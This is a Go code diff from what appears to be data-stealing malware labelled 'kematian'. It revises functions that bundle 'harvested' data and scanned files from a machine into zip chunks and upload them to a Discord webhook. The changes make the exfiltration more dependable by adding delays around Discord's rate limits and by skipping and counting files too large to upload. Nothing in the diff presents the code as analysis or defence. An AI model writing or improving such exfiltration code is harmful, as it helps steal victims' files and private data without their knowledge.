@@ -17,6 +17,9 @@ func uploadAllHarvest(webhook, hostname string, p *harvestPayload, quiet bool) e
 		return err
 	}
 
+	// Discord rate-limits back-to-back webhook file uploads; wait before phase 2.
+	discordUploadDelay()
+
 	if !quiet {
 		log.Printf("[kematian] primary upload complete, starting scanned files upload")
 	}
@@ -49,16 +52,19 @@ func uploadScannedFiles(webhook, baseFilename string, p *harvestPayload, quiet b
 	}
 
 	// Built only after primary upload has finished.
-	chunks, err := buildScannedFilesZipChunks(p)
+	chunks, skippedLarge, err := buildScannedFilesZipChunks(p)
 	if err != nil {
-		return err
+		return fmt.Errorf("build scanned files zip: %w", err)
 	}
 	if len(chunks) == 0 {
+		if !quiet && skippedLarge > 0 {
+			log.Printf("[kematian] no uploadable scanned files (%d too large for Discord)", skippedLarge)
+		}
 		return nil
 	}
 
 	filesBase := baseFilename + "-files"
-	return uploadZipChunks(webhook, filesBase, "Kematian files", scannedFilesSummary(fileCount), chunks, "files", quiet)
+	return uploadZipChunks(webhook, filesBase, "Kematian files", scannedFilesSummary(fileCount, skippedLarge), chunks, "files", quiet)
 }
 
 func uploadZipChunks(webhook, baseFilename, title, summary string, chunks [][]byte, phaseLabel string, quiet bool) error {
@@ -88,9 +94,8 @@ func uploadZipChunks(webhook, baseFilename, title, summary string, chunks [][]by
 		if err := sendDiscordWebhook(webhook, title, partSummary, zipData, filename); err != nil {
 			return fmt.Errorf("upload %s: %w", filename, err)
 		}
-		if i < len(chunks)-1 {
-			discordUploadDelay()
-		}
+		// Delay after every successful upload (including the last chunk of a phase).
+		discordUploadDelay()
 	}
 	return nil
 }
